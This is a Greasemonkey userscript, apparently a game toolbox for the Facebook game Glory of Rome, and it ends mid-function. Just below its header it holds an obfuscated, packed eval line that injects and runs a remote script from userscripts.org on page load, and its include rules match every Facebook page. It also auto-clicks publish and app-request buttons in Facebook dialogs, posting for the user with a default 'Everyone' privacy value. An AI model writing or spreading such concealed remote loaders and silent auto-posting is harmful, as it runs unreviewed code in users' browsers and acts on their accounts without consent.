// ==UserScript==
// @name           GOR BoiteOutils Plus + Last Update
// @version        0.4.0
// @namespace      GOR BoiteOutils
// @description    Boite a Outils pour Glory Of Rome - By BeWorld
// @resource 	   URL_CASTLE_BUT 		http://i.imgur.com/MPlZr.png
// @resource 	   URL_CASTLE_BUT_SEL 		http://i.imgur.com/XWR4B.png
// @include        *facebook.com/gloryofrome/*
// @include        *gloryofrome.com/*gameChrome_src.php*
// @include    	   *gloryofrome.com/iframeCanvas.php*
// @include        *facebook.com/dialog/feed*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include        *facebook.com/dialog/apprequests*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var Version = '0.4.0';
var miseajour="Version BETA "+Version +" by BeWorld 2012";
var sitesupport="http://beworld.perso.sfr.fr/glory/";
var DISABLE_BULKADD_LIST = false;
var DEBUG_TRACE = true;

var URL_CASTLE_BUT = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAXCAMAAAGkBsQ5AAABa1BMVEX%2F%2F8X%2F98X%2F973%2F97X%2F77X%2F7633773%2F76X377X3763%2F5q3%2F5qX%2F5pz35q335qX%2F3pz%2F3pT33pz%2F1pT%2F1oz%2F1oT31pT31oz%2FzoT%2Fznv3zoT%2FxXv%2FxXP%2FxWv3xXv3xXP%2FvWv%2FvWP3vWv3vWP%2FtWP%2FtVr%2FtVLmvWv3tWP3tVr3tVL%2FrVL%2FrUrmtWP3rVL3rUrvrVL%2FpUrvrUr%2FpULmrVrmrVL3pUr3pULmpUL3nDrepULWpVLWpUrmnDrFpUK1pVrOnDqcnFKcnEqMnEp7lHN7lGtzlGNrlGtjjEpajFpShFJSe2NChEJKe1o6hDohjDFCc1oZjDEhhDEQjDEAlDEpezoZhDEhezoQhDEAjDEpczoZezoIhDEhc0IhczoAhDEZczoIezEhazoAezEhY0IAczEAcykIazEhWkIAazEAaykIYzEhUkIAYzEAWjEAUjEAUikASjEASikAQjEAQikAOjEAOikAMTEAMSkAKSlOGAcLAAAACXBIWXMAAAsSAAALEgHS3X78AAABVklEQVQYGQXBPW4TYRiF0ee%2B3x2DRSxRIFJTGIkVUFDQIbEDlkE5%2B8kWWEKKIBSB5AohXBGUSAaCIdgz3x%2FnaARztjS3RSPodPkmfuzReLbOh1fm72a4h3kxyWgE8NXPz8%2F%2FhC%2FzRXLM3cmeqvGDl7Mfa9ztT9pvp3%2FDOpjOr7Yft9PXjPHxE%2Bl6p4SJqSq5RsL4EAtZaUAjAABoBADAt%2Fty8ovVnhQ%2Bfx%2BbDTfXQ9Bz5H7IdWGV9k588NJWrQiXjMkdly6Fo9beRap29F4QJBxTE%2Bo9bF7XuUpJsp8BAGjcATSgADOQWRsfLu8WT0%2B33wcePknfJj%2B6j3Hb17m5HQsr1%2Fm4aGBEbtp8uXPWzcSBlhYYXKunObLoOyU1jFH02oVRZNFJQ2CCko26MIrC3MAEpRdcSVkYFYzBuaAuQFFAgzFBK0GVZhYoaUYYVm8b0IAGNDr8B8ZXpEbZNGQ6AAAAAElFTkSuQmCC";
var URL_CASTLE_BUT_SEL = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAXAgMAAAHuttyYAAAACVBMVEX%2F%2F%2F8AOjEAKSnbo5E5AAAACXBIWXMAAAsSAAALEgHS3X78AAAAW0lEQVQI12NYwdAAhCsYOICwQQGEpiYwrGpgCHRgcIChUAeGqaERDBMZJRgmMCDwqlUrgHgBQ2hoAIMjiwAYOzBgxyA1ILVTQ4GggWEKK4MIK4JiYGAgiYKYAgBFlyWR9CCfyAAAAABJRU5ErkJggg%3D%3D";

var DEFAULT_ALERT_SOUND_URL = 'http://www.universal-soundbank.com/mp3/sounds/2935.mp3';

var Options = {
  ptWinIsOpen  : false,pbEveryEnable:false,pbEveryMins:60,
  ptWinDrag    : true,
  enableFoodWarnTchat: false,
  pbGoldEnable : false,
  foodWarnHours : 24,
  pbChatOnRight: false,
  pbGoldHappy  : 75,
  pbRessTime:   15,
  pbRessEnable:false,
  arPageFrom:1,
  arPageTo:4,
  srcMinLevel:1,
  srcMaxLevel:10,
  filPuissance:0,
  filPuissanceMax:100000000,
  filfiltreAlliance:'',
   filfiltreJoueur:'',
  ptWinPos     : {},
  alertConfig  : {
  	aChat:true,
  	aPrefix:"*** On m'attaque !!! ***",
  },
  alertSound : {
    enabled:false,
    soundUrl:DEFAULT_ALERT_SOUND_URL,
    repeat:true,
    repeatDelay:10,
    playLength:20,
    volume:100,
    alarmActive:false,
    expireTime:0,
  },
  towerMarches : {},
  HelpRequest: true,
  DeleteRequest: false,
  AttackTime:{},
};

var GlobalOptions = {
  autoPublishGamePopups : true,
  autoPublishPrivacySetting : 80,
  autoPublishKDO: false, 
  autoPublishKDOWho: 0, 
  BOAutomateKDO: false,
  BOAutomateKDOsec: 10,
  BOAutomateKDOChoice: 1005,

};

var TrainOptions = {
  Running   : false,
  list:{},
  listactif:{},
  timelauch:60,
  pourcpop:75,
  pourctot:100,
  unitemin:100,
};

var JSON;if(!JSON){JSON={};}(function(){"use strict";function f(n){return n<10?'0'+n:n;}if(typeof Date.prototype.toJSON!=='function'){Date.prototype.toJSON=function(key){return isFinite(this.valueOf())?this.getUTCFullYear()+'-'+f(this.getUTCMonth()+1)+'-'+f(this.getUTCDate())+'T'+f(this.getUTCHours())+':'+f(this.getUTCMinutes())+':'+f(this.getUTCSeconds())+'Z':null;};String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(key){return this.valueOf();};}var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={'\b':'\\b','\t':'\\t','\n':'\\n','\f':'\\f','\r':'\\r','"':'\\"','\\':'\\\\'},rep;function quote(string){escapable.lastIndex=0;return escapable.test(string)?'"'+string.replace(escapable,function(a){var c=meta[a];return typeof c==='string'?c:'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);})+'"':'"'+string+'"';}function str(key,holder){var i,k,v,length,mind=gap,partial,value=holder[key];if(value&&typeof value==='object'&&typeof value.toJSON==='function'){value=value.toJSON(key);}if(typeof rep==='function'){value=rep.call(holder,key,value);}switch(typeof value){case'string':return quote(value);case'number':return isFinite(value)?String(value):'null';case'boolean':case'null':return String(value);case'object':if(!value){return'null';}gap+=indent;partial=[];if(Object.prototype.toString.apply(value)==='[object Array]'){length=value.length;for(i=0;i<length;i+=1){partial[i]=str(i,value)||'null';}v=partial.length===0?'[]':gap?'[\n'+gap+partial.join(',\n'+gap)+'\n'+mind+']':'['+partial.join(',')+']';gap=mind;return v;}if(rep&&typeof rep==='object'){length=rep.length;for(i=0;i<length;i+=1){k=rep[i];if(typeof k==='string'){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}else{for(k in value){if(Object.hasOwnProperty.call(value,k)){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}v=partial.length===0?'{}':gap?'{\n'+gap+partial.join(',\n'+gap)+'\n'+mind+'}':'{'+partial.join(',')+'}';gap=mind;return v;}}if(typeof JSON.stringify!=='function'){JSON.stringify=function(value,replacer,space){var i;gap='';indent='';if(typeof space==='number'){for(i=0;i<space;i+=1){indent+=' ';}}else if(typeof space==='string'){indent=space;}rep=replacer;if(replacer&&typeof replacer!=='function'&&(typeof replacer!=='object'||typeof replacer.length!=='number')){throw new Error('JSON.stringify');}return str('',{'':value});};}if(typeof JSON.parse!=='function'){JSON.parse=function(text,reviver){var j;function walk(holder,key){var k,v,value=holder[key];if(value&&typeof value==='object'){for(k in value){if(Object.hasOwnProperty.call(value,k)){v=walk(value,k);if(v!==undefined){value[k]=v;}else{delete value[k];}}}}return reviver.call(holder,key,value);}text=String(text);cx.lastIndex=0;if(cx.test(text)){text=text.replace(cx,function(a){return'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);});}if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,'@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,']').replace(/(?:^|:|,)(?:\s*\[)+/g,''))){j=eval('('+text+')');return typeof reviver==='function'?walk({'':j},''):j;}throw new SyntaxError('JSON.parse');};}}());
var JSON2 = JSON; 

var FBsecondTimer = null;
var pbStartupTimer = null;
var my = {};
var Cities = {};
var currentName = 'Overview';
var Seed = unsafeWindow;
var currentPage ='';
var mainPop;
var Tabs = [
  ['Overview', 'R&eacute;sum&eacute;'],
  ['Hud', 'Rapports'],
  ['marches', 'Marches'],
  ['AllianceList', 'Joueur'],
  ['Search', 'Chercher'],
  ['TranspAuto', 'Transporter'],
  ['Reassign', 'R&eacute;affecter'],
  ['Wilds', 'R&eacute;gions'],
  ['autoFormation', 'AutoForm'],
  ['Train', 'Formation'],
  ['Crests', 'Info'],
  ['KDO', 'Cadeaux'],
  ['Options' , 'Options']
];

var myServerId = null;
function getServerId() {
  if (myServerId == null){
    var m=/^[a-zA-Z]+([0-9]+)\./.exec(document.location.hostname);
    if (m)
      myServerId = m[1];
    else
      myServerId = '??';
  }
  return myServerId;
}


var nHtml={
  FindByXPath:function(obj,xpath,nodetype) {
	if(!nodetype){
		nodetype = XPathResult.FIRST_ORDERED_NODE_TYPE;
	}
	try {
		var q=document.evaluate(xpath,obj,null,nodetype,null);
	} catch(e) {
		GM_log('bad xpath:'+xpath);
	}
	if(nodetype == XPathResult.FIRST_ORDERED_NODE_TYPE){
		if(q && q.singleNodeValue) { return q.singleNodeValue; }
	}else{
		if(q){
			return q;
		}
	}
	return null;
  },
  
  ClickWin:function(win,obj,evtName) {
	var evt = win.document.createEvent("MouseEvents");
	evt.initMouseEvent(evtName, true, true, win,
		0, 0, 0, 0, 0, false, false, false, false, 0, null);
	return !obj.dispatchEvent(evt);
  },

  Click:function(obj) {
	return this.ClickWin(window,obj,'click');
  },
  
  ClickTimeout:function(obj,millisec) {
	window.setTimeout(function() {
		return nHtml.ClickWin(window,obj,'click');
	},millisec+Math.floor(Math.random()*500));
  },

  SetSelect:function(obj,v) {
	for(var o=0; o<obj.options.length; o++) {
		if(v==obj.options[o].value) { obj.options[o].selected=true; return true; }
	}
	return false;
  },

}

function readGlobalOptions (){
  GlobalOptions = JSON2.parse (GM_getValue ('Options_??', '{}'));
}

readGlobalOptions ();

function setWide (){
    var iFrame = null;
    var e = document.body;
    if(e){
	for (var c=0; c<e.childNodes.length; c++){
		  if (e.childNodes[c].tagName=='DIV') {
		     if (e.childNodes[c].firstChild.tagName == 'IFRAME'){
		      iFrame=e.childNodes[c].firstChild;
		      break;
		     }
			
		  }
		
	 }
	}  
    if (iFrame)  { 
      iFrame.style.width = '100%';
    
    }
    
}

if (document.URL.search(/gloryofrome.com\/iframeCanvas/i) >= 0){
 setTimeout (setWide, 1000);
 return;
}
if (document.URL.search(/apps.facebook.com\/gloryofrome/i) >= 0){
  facebookInstance ();
  return;
}

if (document.URL.search(/www.facebook.com\/dialog\/feed/i) >= 0){
  HandlePublishPopup();
  return;
}
if (document.URL.search(/facebook.com\/dialog\/apprequests/i) >= 0){
  HandlePublishPopup2();
  return;
}  

function HandlePublishPopup2() {

 if(GlobalOptions.autoPublishKDO){
 
 var FBInputForm = document.getElementById('uiserver_form');
 if(FBInputForm){
  
  // choix du KDO !
  
  var input_data = nHtml.FindByXPath(FBInputForm,".//input[@type='hidden' and contains(@name,'input_data')]");
  if (input_data) {
    //input_data.value = 1035; // 40K pierre
    //input_data.value = 1045; // 40K de fer
    //input_data.value = 1025; // 40K bois
    //input_data.value = 1015 ; //40K bouffe
    //input_data.value = 1005 ; //40k d'argent
  }
  
  var channel_input = nHtml.FindByXPath(FBInputForm,".//input[@type='checkbox' and contains(@name,'checkableitems[]')]");
  if (channel_input) {
   channel_input.value=GlobalOptions.autoPublishKDOWho;
   if (!channel_input.checked) {
    nHtml.Click(channel_input);
   } 
   var publish_button = nHtml.FindByXPath(FBInputForm,".//input[@type='submit' and contains(@name,'ok_clicked')]");
   if (publish_button) {
     nHtml.Click(publish_button);
   }
  }  
  }
 }
 setTimeout(HandlePublishPopup2, 1500);
}



function HandlePublishPopup() {
 if(GlobalOptions.autoPublishGamePopups){
    		// Check the app id (we only want to handle the popup for kingdoms of camelot)
		var FBInputForm = document.getElementById('uiserver_form');
		if(FBInputForm){
			var channel_input = nHtml.FindByXPath(FBInputForm,".//input[contains(@name,'channel')]");
			
			if(channel_input){
				var current_channel_url = channel_input.value;
				//if (current_channel_url.match(/gloryofrome/i) >= 0) {
					var publish_button = nHtml.FindByXPath(FBInputForm,".//input[@type='submit' and contains(@name,'publish')]");
					//var privacy_setting = nHtml.FindByXPath(FBInputForm,".//input[@type='hidden' and contains(@name, 'privacy_data') and contains(@name, 'value')]");
					
					if(publish_button){ // && privacy_setting
						// 80: Everyone
						// 50: Friends of Friends
						// 40: Friends Only
						// 10: Only Me
						//if(privacy_setting.value != Options.autoPublishPrivacySetting && Options.autoPublishPrivacySetting != 0)
						//privacy_setting.value = GlobalOptions.autoPublishPrivacySetting;
						nHtml.Click(publish_button);
					}
				//}
			}		
		}
 
   }
         	setTimeout(HandlePublishPopup, 1500);
}

/***  Run only in "apps.facebook.com" instance ... ***/
function facebookInstance (){
  function setWide (){ 
    var iFrame = null;
    var e = document.getElementById('app_content_140956165916773');
    if (!iFrame){
      var iframes = document.getElementsByTagName('iframe');
      for (var i=0; i<iframes.length; i++){
        if (iframes[i].className=='canvas_iframe_util noresize'){
          iFrame = iframes[i];
          break; 
        } 
      }
    }
    if (!iFrame){
      setTimeout (setWide, 1000);
      return;
    }
    try{    
      document.getElementById('rightCol').parentNode.removeChild(document.getElementById('rightCol'));
      document.getElementById('leftColContainer').parentNode.removeChild(document.getElementById('leftColContainer'));
      document.getElementById('sidebar_ads').parentNode.removeChild(document.getElementById('sidebar_ads'));
      document.getElementById('canvas_nav_content').parentNode.removeChild(document.getElementById('canvas_nav_content'));
  
    } catch (e){
      // toolkit may have removed them already!
    }

  var e = document.getElementById('mainContainer');
 	if(e){
 		document.getElementById('content').style.minWidth = '1220px';
 		document.getElementById('content').style.width='100%';
 		for(i=0; i<e.childNodes.length; i++){
 			if(e.childNodes[i].id == 'contentCol'){
 				e.childNodes[i].style.width = '100%';
 				e.childNodes[i].style.margin = '0px';
 				e.childNodes[i].style.paddingTop = '5px';
 				e.childNodes[i].childNodes[1].style.width = '99%';
 				break;
 			}
 		}
 	}
 	var e = document.getElementById('globalContainer');
 	if(e){
 		e.style.width = '100%';
 		if(e.firstChild){
 			e.firstChild.style.width = '100%';
 			e.firstChild.style.margin = '0 0%';
 		}
 	}
 	var e = document.getElementById('bottomContent');
 	if(e){
 		e.style.padding = "0px 0px 12px 0px";
 	}
 	var e = document.getElementById('contentArea');
 	if(e){
 		e.style.width = '100%';
 		for(i=0; i<e.childNodes.length; i++){
 			if(e.childNodes[i].tagName == 'div'){
 				e.childNodes[i].style.width = '100%';
 				e.childNodes[i].firstChild.style.width = '100%';
 				break;
 			}
 		}
 	}
 	var e = document.getElementById('pagelet_canvas_content');
 	if(e){
 		e.style.width = '100%';
 	}
 	iFrame.style.width = '100%';
 	 
     var div = searchDOM (document.getElementById('content'), 'node.tagName=="DIV" && node.className=="UIStandardFrame_Content"', 7);
     if (div){
 		div.style.width ='100%';
 	}
     var div = searchDOM (document.getElementById('content'), 'node.tagName=="DIV" && node.className.indexOf("SidebarAds")>=0', 7);
     if (div){
 		div.style.display ='none';
 	}
     }

   setWide();
}



var WideScreen = {
  chatIsRight : false,
  rail : null,
  
  init : function (){
    t = WideScreen;

      try {
        document.getElementById('mainCrossBar').parentNode.removeChild(document.getElementById('mainCrossBar'));
      } catch (e) {
      }

  },
        
  setChatOnRight : function (tf){
    t = WideScreen;
    if (tf == t.chatIsRight)
      return;
    if (tf){
      var chat = document.getElementById('kocmain_bottom');
       if (!chat || chat.className!='mod_comm')
        setTimeout (function (){t.setChatOnRight(tf)}, 1200); 
    
      if (getMyAlliance()[1]!="Aucune")
       document.getElementById("chat_button2").innerHTML="<span>" +getMyAlliance()[1]+ "</span>";
      document.getElementById("comm_tabs").style.left = '761px';
      document.getElementById("comm_tabs").style.top = '-590px';
      document.getElementById("comm_tabs").style.backgroundColor="#60533E";
      var div = searchDOM (document.getElementById('kocmain_bottom'), 'node.tagName=="DIV" && node.className.indexOf("comm_body comm_global")>=0', 7);
      if (div){
        //alert('troue!!');
          div.style.left = '761px';
	  div.style.top = '-565px';
	  div.style.height= '700px';
          div.style.backgroundColor="#60533E";
      
      var div1 = searchDOM (div, 'node.tagName=="DIV" && node.className.indexOf("chat-wrapper")>=0', 7);
      if (div1){
         div1.style.height='700px';
      }
      }
      document.getElementById("mod_comm_list1").style.height= '650px';
      document.getElementById("mod_comm_list2").style.height= '650px';
    } else {
      document.getElementById("comm_tabs").style.left = '';
      document.getElementById("comm_tabs").style.top = '';
         document.getElementById("comm_tabs").style.backgroundColor="";
         var div = searchDOM (document.getElementById('kocmain_bottom'), 'node.tagName=="DIV" && node.className.indexOf("comm_body comm_global")>=0', 7);
         if (div){
          div.style.left = '';
   	  div.style.top = '';
          div.style.backgroundColor="";
          var div1 = searchDOM (div, 'node.tagName=="DIV" && node.className.indexOf("chat-wrapper")>=0', 7);
	   if (div1){
	     div1.style.height= '';
          }
      }
      document.getElementById("mod_comm_list1").style.height= '100%';
      document.getElementById("mod_comm_list2").style.height= '100%';
    }
    t.chatIsRight = tf;
  }
  
}

function ptStartup() {


  GM_addStyle ('.xtab {padding: 2px; border:none; background:none; white-space:nowrap;}\
    .hostile td { background:crimson; }.friendly td{background:lightblue; }.ally td{background:royalblue; }\
    .Hostile td { background:crimson; }.Friendly td{background:lightblue; }.Ally td{background:royalblue; }\
    .neutral td { background:lightgreen; }.unaligned td { background:gold; }\
    .Neutral td { background:lightgreen; }.Unaligned td { background:gold; }\
    .xtabBR {padding-right: 5px; border:none; background:none;}\
    div.ptDiv {background-color:#f0f0f0;}\
    table.marches tr td {padding:4px;border:1px black solid; background:none; white-space:nowrap;}\
    table.ptTab tr td {padding:2px;border:none; background:none; white-space:nowrap;}\
    table.ptTabPad tr td {border:none; background:none; white-space:nowrap; padding: 2px 4px 2px 8px;}\
    table.ptTabBR tr td {border:none; background:none;}\
    table.ptTabLined tr td {border:1px none none solid none;}\
    table.ptTabPad tr td.ptentry {background-color:#ffeecc; padding-left: 8px;}\
    table.ptTabOverview tr td {border:1px none none solid none; white-space:nowrap; padding: 1px 2px;  font-size:12px;}\
    .xxtab{background-color:none; padding-left:5px; padding-right:5px;}\
    .xxtab_even{background-color:#ccc; padding-left:5px; padding-right:5px;}\
    table.ptNoPad tr td {border:none; background:none; white-space:nowrap; padding:0px}\
    .ptOddrow {background-color:#eee}\
    .ptstat {border:1px solid; border-color:#ffffff; font-weight:bold; padding-top:2px; padding-bottom:2px; text-align:center; color:#ffffff; background-color:#357}\
    .ptStatLight {color:#ddd}\
    .ptentry {padding: 7px; border:1px solid; border-color:#000000; background-color:#ffeecc; white-space:nowrap;}\
    .ptErrText {font-weight:bold; color:#600000}\
    .castleBut {outline:0px; margin-left:0px; margin-right:0px; width:24px; height:26px; font-size:12px; font-weight:bold;}\
    .castleBut:hover {border-size:3px; border-color:#000;}\
    .castleButNon {background-image:url("'+ URL_CASTLE_BUT +'")}\
    .castleButSel {background-image:url("'+ URL_CASTLE_BUT_SEL +'")}\
    button::-moz-focus-inner, input[type="submit"]::-moz-focus-inner { border: none; }\
    .ptChatWhisper {}\
    .ptChatAttack {color: #000; font-weight:bold; background-color: #FF7D7D; }\
    .ptChatAlliance {}\
    .ptChatGlobal {background-color: #fdd}\
    .ptChatIcon {border: 2px inset blue}\
    input.BODefButOn {cursor:pointer; border:1px solid black; background-color:red;}\
    input.BODefButOff {cursor:pointer; border:1px solid black; background-color:#0a0;}\
    span.whiteOnRed {padding-left:3px; padding-right:3px; background-color:#700; color:white; font-weight:bold}\
    span.boldRed {color:#800; font-weight:bold}\
    span.boldDarkRed {color:#600; font-weight:bold}\
    a.ptButton20 {color:#ffff80}\
   .matTab {}\
   .matTabNotSel { padding:0 0 0 20px;  color : #2F230E; font: bold 11px Georgia; white-space: nowrap; cursur:pointer; padding:0 0px 0 0;height: 17px; }\
   .matTabNotSel span { background: url("http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/nav/tab_unselected.png") no-repeat scroll left 0 transparent;    display: inline-block;    height: 16px;    padding: 1px 2px 0 7px;    text-decoration: none;   }\
   .matTabSel { color : #2F230E; font: bold 11px Georgia; white-space: nowrap; cursur:pointer; padding:0 0px 0 0;height: 17px;   }\
   .matTabSel span { background: url("http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/nav/tab_selected.png") no-repeat scroll left top transparent; display: inline-block;    height: 16px;    padding: 1px 2px 0 7px;    text-decoration: none;   }\
   tr.CPopupTop td { background-color:#dde; border:none; height: 15px;  padding:0px; }\
   .BOptretry_top { background-color:#a00; color:#fff; border:none; height: 21px; padding:0px; }\
   input.ptButCancel {background-color:#a00; font-weight:bold; color:#fff}\
    .id2_CPopupTop td { background-color:#ffffff;}\
    .CPopup .CPopMain { background-color:#f8f8f8; padding:3px;}\
    .CPopup .id2_CPopMain { background-color:#8ff; }\
    .CPopup  { border:3px ridge #666 }\
    .idp2_CPopup { opacity:0.9; }');
  
  clearTimeout (pbStartupTimer);
  if (unsafeWindow.BOGpbLoaded)
      return;
      
  var metc = getClientCoords(document.getElementById('main_engagement_tabs'));
  if (metc.width==null || metc.width==0){
      pbStartupTimer = setTimeout (ptStartup, 1000);
      return;
  }

  unsafeWindow.BOGpbLoaded = true;
  
  readOptions();
  
  readTrainingOptions ();

  var Seed = unsafeWindow;
  
  

  setCities();

  
  if (Options.ptWinPos==null || Options.ptWinPos.x==null|| Options.ptWinPos.x=='' || isNaN(Options.ptWinPos.x)){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    Options.ptWinPos.x = c.x+4;
    Options.ptWinPos.y = c.y+c.height;
    saveOptions ();
  }
 
  mainPop = new CPopup ('idp', Options.ptWinPos.x, Options.ptWinPos.y, 760,730, true, 
      function (){
        my[currentName].hide();
        Options.ptWinIsOpen=false; 
        saveOptions()
      });
    
   
  var mainDiv = mainPop.getMainDiv();
  mainPop.getTopDiv().innerHTML = '<TABLE cellspacing=0 width=100%><TR class=CPopupTop valign=bottom><TD><SPAN id=idTabs></span></td><TD align=right rowspan=2>'+ Version +'&nbsp;<iframe src="" id="BOsound" frameborder=0 height=0 width=0></iframe></td></tr><tr><td><span id=idTabs3></span></tr></table>';

  var eTabs = document.getElementById('idTabs');
  for (k=0; k<Tabs.length; k++){
    var a=document.createElement('a');
    a.className='matTabNotSel';
    a.id = 'aa'+ Tabs[k][0];
    a.innerHTML='<span id="sp'+ Tabs[k][0] +'" class="matTab">'+ Tabs[k][1] +'</span>';
    if (k==9) {
             var eTabs = document.getElementById('idTabs3');
             eTabs.innerHTML+="</tr><tr><td>";
     } 
    
    eTabs.appendChild(a);
    a.addEventListener('click', clickedTab, false);
    my[Tabs[k][0]].init();
    cont = my[Tabs[k][0]].getContent();
    cont.style.display = 'none';
    mainDiv.appendChild(cont);
  }

  setTabStyle (document.getElementById ('aaOverview'), true);
  my.Overview.getContent().style.display = 'block';
  
  if (Options.ptWinIsOpen){
    mainPop.show (true);
    my[currentName].show();
  }
  window.addEventListener('unload', onUnload, false);
  AddMainTabLink("Boite", eventHideShow, mouseMainTab);
 
  CollectGold.init();
  CollectRessource.init();
RefreshEvery.init();
  FoodAlerts.init();
  
  TowerAlerts.init();
  TowerAlerts.setPostToChatOptions(Options.alertConfig);
  battleReports.init();
  WideScreen.init ();
  WideScreen.setChatOnRight (Options.pbChatOnRight); 
  
  setInterval (HandleChatPane,2500);
  

}

function onUnload (){
  Options.ptWinPos = mainPop.getLocation();
  saveOptions();
}



var CalterUwFunc = function (funcName, findReplace) {
  var t = this;
  this.isEnabled = false;
  this.isAvailable = isAvailable;
  this.setEnable = setEnable;
  this.funcName = funcName;
  this.funcOld = unsafeWindow[funcName];  
  this.funcNew = null;
  try {
    var funcText = unsafeWindow[funcName].toString();
    var rt = funcText.replace ('function '+ funcName, 'function');
    for (var i=0; i<findReplace.length; i++){
      x = rt.replace(findReplace[i][0], findReplace[i][1]);
      if (x == rt)
        return false;
      rt = x;
    }
    this.funcNew = rt;
  } catch (err) {
  }
      
  function setEnable (tf){
    if (t.funcNew == null)
      return;
    if (t.isEnabled != tf){
      if (tf){
      	var scr=document.createElement('script');
      	scr.innerHTML = funcName +' = '+ t.funcNew;
      	document.body.appendChild(scr);
        setTimeout ( function (){document.body.removeChild(scr);}, 0);
      	t.isEnabled = true;
      } else {
        unsafeWindow[t.funcName] = t.funcOld;
        t.isEnabled = false;
      }
    }
  }
  function isAvailable (){
    if (t.funcNew == null)
      return false;
    return true;
  }
};
var battleReports = {
  init : function (){
    var t = battleReports; 
    t.renderBattleReportFunc = new CalterUwFunc ('MarchReport.render', [['c.push(this.renderBackButton());','c.push(this.renderBackButton());c.push("<button class=button25>Banzai</button>");']]); 
    //unsafeWindow.renderBattleReport_hook = t.hook2;
    t.renderBattleReportFunc.setEnable (true);
    //unsafeWindow.deleteAreport = t.e_deleteReport;
    
  },
  e_deleteReport : function (rptid){    var t = battleReports;     t.ajaxDeleteMyReport (rptid);  },
   ajaxDeleteMyReport : function (rptid, isUnread, side, isCityReport, notify){
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.s0rids = rptid;
    params.s1rids = '';
    params.cityrids = '';
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/deleteCheckedReports.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        if (rslt.ok && isUnread){
          unsafeWindow.seed.newReportCount = parseInt(unsafeWindow.seed.newReportCount) - 1;
          unsafeWindow.messages_notify_bug()
        }    
        unsafeWindow.Messages.listReports();
        if (notify)
          notify (rslt.errorMsg);
      },
      onFailure: function () {
        if (notify)
          notify ('AJAX ERROR');
      },
    });
  },
  
  hook2 : function (msg, args, rslt){
    if (Options.reportDeleteButton){
  	msg = msg.replace(/rapport<\/span><\/a>/im, 'rapport</span></a><a class=\'button20\' onclick=\'deleteAreport('+args[0]+',false)\'><span>'+unsafeWindow.g_js_strings.commonstr.deletetx+'</span></a>'); //Delete button
			return msg;
    }else {
     return msg;
    }
  },

}
/************************ Tower Alerts ************************/
var TowerAlerts = {
  viewImpendingFunc : null,
  generateIncomingFunc : null,
  AlarmeTimer: null,
  fixTargetEnabled : false,
  compteur: 0,
  init : function (){
    var t = TowerAlerts; 
  },
  secondTimer : null,
  setPostToChatOptions : function (obj){
     var t = TowerAlerts;
     clearTimeout(t.secondTimer);
     if (Options.alertConfig.aChat)
 		t.e_eachSecond();
  },
  e_eachSecond : function (){   // check for incoming marches
     var t = TowerAlerts;
     var now = unixTime();
     
     unsafeWindow.player.allCities().sortBy(function(c){return c.number}).each(function(f,c){
             var d="",e="";
        if(f.underAttack()) {
        
          Cities.byID[f.id].c.incomingAttackMarches().each(function(c){
           var b=Cities.byID[f.id].c.marches.incoming[c.id];
           var arrivalTime = b.secondsToDestination()>0?b.secondsToDestination():0;
   	   
           if ((arrivalTime>0)  && (t.getTowerMarch(b.id)==null || t.getTowerMarch(b.id)==undefined)) 
          {
            t.addTowerMarch (b.id, arrivalTime);
            if (Options.alertSound.enabled){
	      my.Options.soundTheAlert();
	      if (arrivalTime > Options.alertSound.expireTime)
	          Options.alertSound.expireTime = arrivalTime;
    	    }
            
            t.postToChat (f, c, false);
            saveOptions (); 
          }
          });
        
        }
        });
     t.secondTimer = setTimeout (t.e_eachSecond, 5000);
      
   },
   addTowerMarch : function (id, arrivalTime){
       var t = TowerAlerts;
       var now = unixTime();

       for (k in Options.towerMarches){
         if ((Options.towerMarches[k].arrival+Options.towerMarches[k].added) < now) {
            //Options.towerMarches[k] = null;
            delete Options.towerMarches[k];
         }
       }
       Options.towerMarches['m' + id] = { added:now, arrival:arrivalTime };
       
  },  
  getTowerMarch : function (mid){ 
     var t = TowerAlerts;
     return Options.towerMarches['m'+mid];
  },
  postToChat: function(f, c, force){
    var t = TowerAlerts;
    
    var e="";
    if(c.from.allianceId>0&&Seed.allianceNames&&Seed.allianceNames["a"+b.from.allianceId]){
          e="(" + Seed.allianceNames["a"+b.from.allianceId] +")";
         }else{
          if(c.from.allianceName!==null){e="(" + c.from.allianceName+")";}
    }
    
    if(Cities.byID[f.id].c.wilds[c.to.tileId]){
   	  var a='TS ' + unsafeWindow.Watchtower.generateCoords(c.to.cityId,c.to.tileId)
    } else{
   	  var a='Ville ' + unsafeWindow.player.cities[c.to.cityId].name + ' ('+unsafeWindow.player.cities[c.to.cityId].x +','+ unsafeWindow.player.cities[c.to.cityId].y +')';
